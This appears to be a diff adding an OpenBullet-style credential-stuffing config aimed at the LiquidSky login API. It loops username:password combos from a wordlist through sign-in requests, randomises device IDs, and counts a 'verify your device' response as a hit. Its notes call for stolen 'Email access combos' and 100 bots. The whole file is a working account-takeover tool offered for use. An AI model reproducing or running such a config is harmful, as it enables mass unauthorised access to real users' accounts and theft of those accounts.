@@ -1,0 +1,37 @@
+[SETTINGS]
+{
+  "Name": "Liquid Sky",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-21T13:10:49.4202078+00:00",
+  "AdditionalInfo": "Needs Email access combos cause of device verification!",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#RANDOM_NUM FUNCTION RandomNum 1000 9999 "" -> VAR "RANDOM" 
+REQUEST POST "https://auth.liquidsky.com/api/v1/sign_in?email=<USER>&password=<PASS>&version_hash=PC-0.3.5-peRlANGe&benchmark=%7B%7D&speed_test=%7B%7D%3A&device_uuid=7355fe17736c<RANDOM>" AutoRedirect=TRUE 
+  CONTENT "FOCKEEN_PLACEHOLDER_BABY" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Please verify your device" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid Email" 
